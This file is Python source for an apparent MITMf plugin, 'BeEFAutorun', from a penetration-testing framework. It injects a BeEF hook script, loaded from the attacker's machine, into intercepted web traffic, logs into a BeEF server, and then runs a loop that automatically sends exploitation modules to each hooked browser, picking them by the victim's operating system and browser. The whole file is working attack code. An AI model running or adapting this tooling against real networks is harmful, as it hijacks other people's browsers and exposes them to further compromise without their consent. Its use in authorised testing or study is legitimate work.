#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import sys
import json
import threading

from time import sleep
from core.beefapi import BeefAPI
from core.utils import SystemConfig, shutdown
from plugins.plugin import Plugin
from plugins.Inject import Inject

mitmf_logger = logging.getLogger("mitmf")

class BeefAutorun(Inject, Plugin):
	name     = "BeEFAutorun"
	optname  = "beefauto"
	desc     = "Injects BeEF hooks & autoruns modules based on Browser and/or OS type"
	version  = "0.3"
	has_opts = False

	def initialize(self, options):
		self.options    = options
		self.ip_address = SystemConfig.getIP(options.interface)

		Inject.initialize(self, options)

		self.tree_info.append("Mode: {}".format(self.config['BeEFAutorun']['mode']))

		beefconfig = self.config['MITMf']['BeEF']

		self.html_payload = '<script type="text/javascript" src="http://{}:{}/hook.js"></script>'.format(self.ip_address, beefconfig['beefport'])

		self.beef = BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
		if not self.beef.login(beefconfig['user'], beefconfig['pass']):
			shutdown("[BeEFAutorun] Error logging in to BeEF!")

	def startThread(self):
		self.autorun()

	def onConfigChange(self):
		self.initialize(self.options)

	def autorun(self):
		already_ran    = []
		already_hooked = []

		while True:
			mode = self.config['BeEFAutorun']['mode']

			for hook in self.beef.hooked_browsers.online:

				if hook.session not in already_hooked:
					mitmf_logger.info("{} [BeEFAutorun] Joined the horde! [id:{}, type:{}-{}, os:{}]".format(hook.ip, hook.id, hook.name, hook.version, hook.os))
					already_hooked.append(hook.session)
					self.black_ips.append(hook.ip)

				if mode == 'oneshot':
					if hook.session not in already_ran:
						self.execModules(hook)
						already_ran.append(hook.session)

				elif mode == 'loop':
					self.execModules(hook)
					sleep(10)

			sleep(1)

	def execModules(self, hook):
		all_modules      = self.config['BeEFAutorun']["ALL"]
		targeted_modules = self.config['BeEFAutorun']["targets"]

		if all_modules:
			mitmf_logger.info("{} [BeEFAutorun] Sending generic modules".format(hook.ip))
			
			for module, options in all_modules.iteritems():

				for m in self.beef.modules.findbyname(module):
					resp = m.run(hook.session, json.loads(options))

					if resp["success"] == 'true':
						mitmf_logger.info('{} [BeEFAutorun] Sent module {}'.format(hook.ip, m.id))
					else:
						mitmf_logger.info('{} [BeEFAutorun] Error sending module {}'.format(hook.ip, m.id))
					
				sleep(0.5)

		if (hook.name and hook.os):
			for os in targeted_modules:
				if (os == hook.os) or (os in hook.os):
					mitmf_logger.info("{} [BeEFAutorun] Sending targeted modules".format(hook.ip))

					for browser in targeted_modules[os]:
						if browser == hook.name:
							for module, options in targeted_modules[os][browser].iteritems():
								for m in self.beef.modules.findbyname(module):
									resp = m.run(hook.session, json.loads(options))
									if resp["success"] == 'true':
										mitmf_logger.info('{} [BeEFAutorun] Sent module {}'.format(hook.ip, m.id))
									else:
										mitmf_logger.info('{} [BeEFAutorun] Error sending module {}'.format(hook.ip, m.id))
								
								sleep(0.5)
